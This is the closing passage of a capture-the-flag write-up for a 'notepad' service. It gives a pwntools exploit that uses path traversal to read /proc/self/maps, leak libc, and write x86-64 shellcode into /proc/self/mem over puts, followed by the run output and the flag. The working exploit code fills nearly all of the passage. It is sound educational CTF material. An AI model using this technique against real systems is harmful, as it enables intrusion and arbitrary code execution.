</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Success&#39;</span> <span style=color:#f92672>in</span> r<span style=color:#f92672>.</span>recvline():
</span></span><span style=display:flex><span>            log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Command </span><span style=color:#e6db74>{</span>cmd_dic[cmd]<span style=color:#e6db74>}</span><span style=color:#e6db74> Successful&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            log<span style=color:#f92672>.</span>error(<span style=color:#e6db74>&#39;Command Login Failed!!!&#39;</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> cmd <span style=color:#f92672>==</span> <span style=color:#ae81ff>3</span>:
</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>sendline(str(cmd)<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Note Name: &#39;</span>, note_name)
</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Content Length: &#39;</span>, content_len)
</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Content: &#39;</span>, content)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;created&#39;</span> <span style=color:#f92672>in</span> r<span style=color:#f92672>.</span>recvline():
</span></span><span style=display:flex><span>            log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Command </span><span style=color:#e6db74>{</span>cmd_dic[cmd]<span style=color:#e6db74>}</span><span style=color:#e6db74> Successful&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            log<span style=color:#f92672>.</span>error(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Command </span><span style=color:#e6db74>{</span>cmd_dic[cmd]<span style=color:#e6db74>}</span><span style=color:#e6db74> Failed!!!&#39;</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> cmd <span style=color:#f92672>==</span> <span style=color:#ae81ff>4</span>:
</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>sendline(str(cmd)<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Note Name: &#39;</span>, note_name)
</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Offset: &#39;</span>, str(offset)<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Content Length: &#39;</span>, str(len(content))<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Content: &#39;</span>, content)
</span></span><span style=display:flex><span>        log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>&#39;Done&#39;</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> cmd <span style=color:#f92672>==</span> <span style=color:#ae81ff>5</span>:
</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>sendline(str(cmd)<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Note Name: &#39;</span>, note_name)
</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Offset: &#39;</span>, offset)
</span></span><span style=display:flex><span>        res <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>128</span>)<span style=color:#f92672>.</span>decode()<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> res
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>read_any_file</span>(file_name):
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;../../../../../../&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/&#39;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>89</span> <span style=color:#f92672>-</span> len(file_name)) <span style=color:#f92672>+</span> file_name
</span></span><span style=display:flex><span>    offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    res <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span>(<span style=color:#66d9ef>True</span>):
</span></span><span style=display:flex><span>        ret <span style=color:#f92672>=</span> dealing_cmd(r, <span style=color:#ae81ff>5</span>, payload, offset<span style=color:#f92672>=</span>str(offset)<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>        <span style=color:#75715e># print(ret, len(ret))</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ret <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;Read note failed.&#39;</span> <span style=color:#f92672>and</span> ret <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;Couldn&#39;t open the file.&#34;</span>:
</span></span><span style=display:flex><span>            res <span style=color:#f92672>+=</span> ret
</span></span><span style=display:flex><span>            offset <span style=color:#f92672>+=</span> <span style=color:#ae81ff>128</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            log<span style=color:#f92672>.</span>success(res)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> res
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>ugly_shellcode</span>():
</span></span><span style=display:flex><span>    <span style=color:#75715e># int fd = socket(AF_INET, SOCK_STREAM, 0);</span>
</span></span><span style=display:flex><span>    socket <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        xor rax, rax
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        mov al, 0x29
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        xor rdi, rdi
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        mov dil, 0x2
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        xor rsi, rsi
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        mov sil, 0x1
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        xor rdx, rdx
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        syscall
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        mov r8, rax
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># info.sin_family = AF_INET;</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># info.sin_addr.s_addr = inet_addr(&#34;127.0.0.1&#34;);</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># info.sin_port = htons(8765);</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># connect(fd, (struct sockaddr *)&amp;info, sizeof(info));</span>
</span></span><span style=display:flex><span>    connect <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        xor rax, rax
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        mov al, 0x2a
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        mov rdi, r8
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        mov rsi, 0xffffffffffffffff
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        mov r9, 0xfeffff80c2ddfffd
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        sub rsi, r9
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        push rsi
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        mov rsi, rsp
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        xor rdx, rdx
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        mov dl, 0x10
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        syscall
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># struct Command cmd;</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># cmd.cmd = 0x8787; // #define CMD_Flag 0x8787</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># write(fd, &amp;cmd, sizeof(cmd));</span>
</span></span><span style=display:flex><span>    write <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        xor r9, r9
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        mov r9w, 0x8787
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        push r9
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        xor rax, rax
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        mov al, 0x1
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        mov rdi, r8
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        mov rsi, rsp
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        xor rdx, rdx
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        mov dl, 0xa4
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        syscall
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># read(fd, $rsp, sizeof(res));</span>
</span></span><span style=display:flex><span>    read <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        xor rax, rax
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        mov rdi, r8
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        mov rsi, rsp
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        xor rdx, rdx
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        mov dx, 0x104
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        syscall
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># write(1, $rsp, 0x40);</span>
</span></span><span style=display:flex><span>    write2console <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        xor rax, rax
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        mov al, 0x1
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        xor rdi, rdi
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        mov dil, 0x1
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        mov rsi, rsp
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        xor rdx, rdx
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        mov dl, 0x40
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        syscall
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> socket <span style=color:#f92672>+</span> connect <span style=color:#f92672>+</span> write <span style=color:#f92672>+</span> read <span style=color:#f92672>+</span> write2console
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Register &amp; Login</span>
</span></span><span style=display:flex><span>init_port <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>]
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;10.113.184.121&#39;</span>, init_port)
</span></span><span style=display:flex><span>random <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>urandom(<span style=color:#ae81ff>1</span>)<span style=color:#f92672>.</span>hex()
</span></span><span style=display:flex><span>dealing_cmd(r, <span style=color:#ae81ff>2</span>, random<span style=color:#f92672>=</span>random)
</span></span><span style=display:flex><span>dealing_cmd(r, <span style=color:#ae81ff>1</span>, random<span style=color:#f92672>=</span>random)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Read /proc/self/maps to leak Libc Base</span>
</span></span><span style=display:flex><span>maps_layout <span style=color:#f92672>=</span> read_any_file(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/proc/self/maps&#39;</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>libc_base <span style=color:#f92672>=</span> int(maps_layout[<span style=color:#ae81ff>7</span>][:<span style=color:#ae81ff>12</span>], <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>puts_addr <span style=color:#f92672>=</span> libc_base <span style=color:#f92672>+</span> libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;puts&#39;</span>]
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Libc Base address: </span><span style=color:#e6db74>{</span>hex(libc_base)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Puts Address: </span><span style=color:#e6db74>{</span>hex(puts_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Get Shellcode</span>
</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>=</span> asm(ugly_shellcode())
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Shellcode = </span><span style=color:#e6db74>{</span>shellcode<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># write 2 /proc/self/mem</span>
</span></span><span style=display:flex><span>file_name <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/proc/self/mem&#39;</span>
</span></span><span style=display:flex><span>path <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;../../../../../../&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/&#39;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>89</span> <span style=color:#f92672>-</span> len(file_name)) <span style=color:#f92672>+</span> file_name
</span></span><span style=display:flex><span>dealing_cmd(r, <span style=color:#ae81ff>4</span>, note_name<span style=color:#f92672>=</span>path, content<span style=color:#f92672>=</span>shellcode, offset<span style=color:#f92672>=</span>puts_addr)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><p>:::</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ python exp-2.py <span style=color:#ae81ff>28961</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>
</span></span><span style=display:flex><span>    Arch:     amd64-64-little
</span></span><span style=display:flex><span>    RELRO:    Partial RELRO
</span></span><span style=display:flex><span>    Stack:    Canary found
</span></span><span style=display:flex><span>    NX:       NX enabled
</span></span><span style=display:flex><span>    PIE:      PIE enabled
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Opening connection to 10.113.184.121 on port 28961: Done
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Command Register Successful
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Command Login Successful
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 55cd58958000-55cd58959000 r--p <span style=color:#ae81ff>00000000</span> 08:01 <span style=color:#ae81ff>22676106</span>                   /home/notepad/notepad
</span></span><span style=display:flex><span>    55cd58959000-55cd5895b000 r-xp <span style=color:#ae81ff>00001000</span> 08:01 <span style=color:#ae81ff>22676106</span>                   /home/notepad/notepad
</span></span><span style=display:flex><span>    55cd5895b000-55cd5895c000 r--p <span style=color:#ae81ff>00003000</span> 08:01 22676106/home/notepad/notepad
</span></span><span style=display:flex><span>    55cd5895c000-55cd5895d000 r--p <span style=color:#ae81ff>00003000</span> 08:01 <span style=color:#ae81ff>22676106</span>                   /home/notepad/notepad
</span></span><span style=display:flex><span>    55cd5895d000-55cd5895e000 rw-p <span style=color:#ae81ff>00004000</span> 08:01 <span style=color:#ae81ff>22676106</span>                   /home/notepad/notepad
</span></span><span style=display:flex><span>    55cd595e1000-55cd59602000 rw-p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>                          <span style=color:#f92672>[</span>heap<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    7f8b72c44000-7f8b72c47000 rw-p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    7f8b72c47000-7f8b72c6f000 r--p <span style=color:#ae81ff>00000000</span> 08:01 <span style=color:#ae81ff>22554614</span>                   /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style=display:flex><span>    7f8b72c6f000-7f8b72e04000 r-xp <span style=color:#ae81ff>00028000</span> 08:01 22554614/usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style=display:flex><span>    7f8b72e04000-7f8b72e5c000 r--p 001bd000 08:01 <span style=color:#ae81ff>22554614</span>                   /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style=display:flex><span>    7f8b72e5c000-7f8b72e60000 r--p <span style=color:#ae81ff>00214000</span> 08:01 <span style=color:#ae81ff>22554614</span>                   /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style=display:flex><span>    7f8b72e60000-7f8b72e62000 rw-p <span style=color:#ae81ff>00218000</span> 08:01 <span style=color:#ae81ff>22554614</span>                   /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style=display:flex><span>    7f8b72e62000-7f8b72e6f000 rw-p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    7f8b72e71000-7f8b72e73000 rw-p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    7f8b72e73000-7f8b72e75000 r--p <span style=color:#ae81ff>00000000</span> 08:01 <span style=color:#ae81ff>22554596</span>                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style=display:flex><span>    7f8b72e75000-7f8b72e9f000 r-xp <span style=color:#ae81ff>00002000</span> 08:01 <span style=color:#ae81ff>22554596</span>                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style=display:flex><span>    7f8b72e9f000-7f8b72eaa000 r--p 0002c000 08:01 <span style=color:#ae81ff>22554596</span>                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style=display:flex><span>    7f8b72eab000-7f8b72ead000 r--p <span style=color:#ae81ff>00037000</span> 08:01 22554596/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style=display:flex><span>    7f8b72ead000-7f8b72eaf000 rw-p <span style=color:#ae81ff>00039000</span> 08:01 22554596/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style=display:flex><span>    7ffc5d268000-7ffc5d289000 rw-p <span style=color:#ae81ff>00000000</span> 00:00 0<span style=color:#f92672>[</span>stack<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    7ffc5d35b000-7ffc5d35f000 r--p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>                          <span style=color:#f92672>[</span>vvar<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    7ffc5d35f000-7ffc5d361000 r-xp 0000000000:00 <span style=color:#ae81ff>0</span>                          <span style=color:#f92672>[</span>vdso<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Libc Base address: 0x7f8b72c47000
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Puts Address: 0x7f8b72cc7e50
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Shellcode <span style=color:#f92672>=</span> b<span style=color:#e6db74>&#39;H1\xc0\xb0)H1\xff@\xb7\x02H1\xf6@\xb6\x01H1\xd2\x0f\x05I\x89\xc0H1\xc0\xb0*L\x89\xc7H\xc7\xc6\xff\xff\xff\xffI\xb9\xfd\xff\xdd\xc2\x80\xff\xff\xfeL)\xceVH\x89\xe6H1\xd2\xb2\x10\x0f\x05M1\xc9fA\xb9\x87\x87AQH1\xc0\xb0\x01L\x89\xc7H\x89\xe6H1\xd2\xb2\xa4\x0f\x05H1\xc0L\x89\xc7H\x89\xe6H1\xd2f\xba\x04\x01\x0f\x05H1\xc0\xb0\x01H1\xff@\xb7\x01H\x89\xe6H1\xd2\xb2@\x0f\x05&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Done
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Switching to interactive mode
</span></span><span style=display:flex><span><span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00flag<span style=color:#f92672>{</span>why_d0_y0u_KnoM_tH1s_c0WW@nd!?<span style=color:#f92672>}</span><span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Got EOF <span style=color:#66d9ef>while</span> reading in interactive
</span></span><span style=display:flex><span>$
</span></span></code></pre></div><p>Flag: <code>flag{why_d0_y0u_KnoM_tH1s_c0WW@nd!?}</code></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#description--hint>Description & Hint</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit---arbitrary-read--arbitrary-write--shellcode>Exploit - Arbitrary Read → Arbitrary Write → Shellcode</a></li></ul></nav></div></aside></main></body></html>